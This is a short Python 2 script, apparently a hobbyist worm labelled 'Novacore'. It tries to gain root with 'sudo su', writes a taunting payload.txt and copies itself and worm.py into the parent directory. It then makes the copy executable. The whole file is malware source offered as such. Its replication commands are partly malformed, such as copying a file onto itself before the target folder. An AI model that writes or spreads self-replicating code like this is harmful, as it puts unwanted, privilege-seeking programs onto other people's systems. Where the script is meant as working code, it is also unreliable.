#NOVACORE

from sys import argv
import os
import Tkinter
from Tkinter import *
import resource
import subprocess

def replicate():
    script=argv
    name=str(script[0])
    #name1=os.system(r'basename "`pwd`"')
    currDirectory= os.path.dirname(name) 
    #currDirectory1=os.system(r" pwd")
    print ">>>>>"
    
    os.system(r"sudo su")
##    print name
##    print name1
##    print currDirectory
##    print currDirectory1

    fd= os.open('payload.txt',  os.O_RDWR|os.O_CREAT)
    os.write(fd,'I am a quine XD.\n I was created by Novacore\n')
    os.close( fd )

            
    #cmd= 'xdg-open payload.txt'
    #os.system(cmd)

    #currfolder=os.path.dirname(currDirectory)
    folder=os.path.dirname(currDirectory)
    #folder1=currDirectory1
    #print os.system(r" pwd")
    #os.system(r"cd .. "+ currDirectory)
    #os.system(r"sudo su mkdir clone")
    #folder='clone'
    
    os.system(r"cp "+name+" replicate.py "+ folder)
    os.system(r"cp worm.py worm.py "+ folder)
    os.system(r"cp payload.txt payload.txt "+ folder)
    os.system(r"cat payload.txt")
        
    os.system(r"chmod +x replicate.py")
    

    ##root = Tk()
    ##root.title('Novacore worm')
    ##Label(text='  See you soon!!!!!!!  ').pack(pady=15)


    ##exit()

if __name__ == "__main__":
    replicate()
